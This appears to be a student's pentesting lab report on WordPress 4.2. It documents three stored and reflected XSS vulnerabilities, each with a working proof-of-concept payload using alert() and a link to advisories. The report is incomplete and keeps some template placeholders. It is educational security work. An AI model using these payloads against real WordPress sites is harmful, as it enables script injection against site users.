# Project 7 - WordPress Pentesting

Time spent: **5** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID
  - [x] Summary: XSS (Authenticated Cross-Site Scripting)
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.6
  - [x] GIF Walkthrough: (XSS1.gif)
  - [x] Steps to recreate: Make a post and then enter the following in the reply:
    
    `http://www.test.com/wp-admin/customize.php?theme=<svg onload=alert(1)>`
  - [x] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/blob/master/wp-admin/customize.php)
2. (Required) Vulnerability Name or ID
  - [x] Summary: 
    - Vulnerability types:Cross-Site Scripting (XSS)
    - Tested in version:4.2
    - Fixed in version: 4.2.3
  - [x] GIF Walkthrough: 
  - [x] Steps to recreate: Make a post and in the body of the post enter the following:
  
  <a href="[caption code=">]</a><a title=" onmouseover=alert('Exploit2!') ">here</a>
  - [x] Affected source code:
   - [WPScan Vulnerability Database Vulnerability #7945](https://wpvulndb.com/vulnerabilities/7945)
   - [Letter by Jouko Pynnönen Regarding the Discovery of the Vulnerability](https://packetstormsecurity.com/files/131644/)

3. (Required) Vulnerability Name or ID
  - [x] Summary: 
    - Vulnerability types:CVE-2015-5734
    - Tested in version: 4.2
    - Fixed in version: 4.2.4
  - [x] GIF Walkthrough: 
  - [x] Steps to recreate: Make a post and type the following as a reply:
  
  `<a href='/wp-admin/' title="" style="position:absolute;top:0;width:10%;height:100%;display:block;" onmouseover=alert(3)//'>TEST</a>`
  - [x] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2019] [Harsh Patel]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
